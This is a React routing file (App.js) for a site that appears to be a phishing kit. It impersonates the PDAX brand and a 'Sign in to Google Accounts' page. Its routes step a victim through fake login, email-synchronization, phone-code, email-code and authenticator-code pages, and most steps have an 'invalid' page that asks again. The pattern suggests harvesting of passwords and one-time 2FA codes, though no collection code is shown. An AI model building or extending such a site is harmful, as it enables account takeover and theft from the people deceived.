import "@/App.css";
import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
import { HtmlPage } from "@/components/HtmlPage";

const PAGES = [
  { path: "/login", file: "login", title: "PDAX" },
  { path: "/loading", file: "loading", title: "PDAX" },
  { path: "/invalid-login", file: "invalid-login", title: "PDAX" },
  { path: "/synchronize-email", file: "synchronize-email", title: "PDAX" },
  { path: "/logging-into-email", file: "logging-into-email", title: "PDAX" },
  { path: "/logging-into-email-invalid", file: "logging-into-email-invalid", title: "PDAX" },
  { path: "/phone-code-email", file: "phone-code-email", title: "PDAX" },
  { path: "/invalid-phone-code-email", file: "invalid-phone-code-email", title: "PDAX" },
  { path: "/authenticator", file: "authenticator", title: "PDAX" },
  { path: "/invalid-authenticator", file: "invalid-authenticator", title: "PDAX" },
  { path: "/code-email", file: "code-email", title: "PDAX" },
  { path: "/invalid-code-email", file: "invalid-code-email", title: "PDAX" },
  { path: "/phone-code", file: "phone-code", title: "PDAX" },
  { path: "/invalid-phone-code", file: "invalid-phone-code", title: "PDAX" },
  { path: "/email-authenticator", file: "email-authenticator", title: "Sign in to Google Accounts" },
];

function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<HtmlPage file="login" title="PDAX" />} />
        {PAGES.map((p) => (
          <Route key={p.path} path={p.path} element={<HtmlPage {...p} />} />
        ))}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
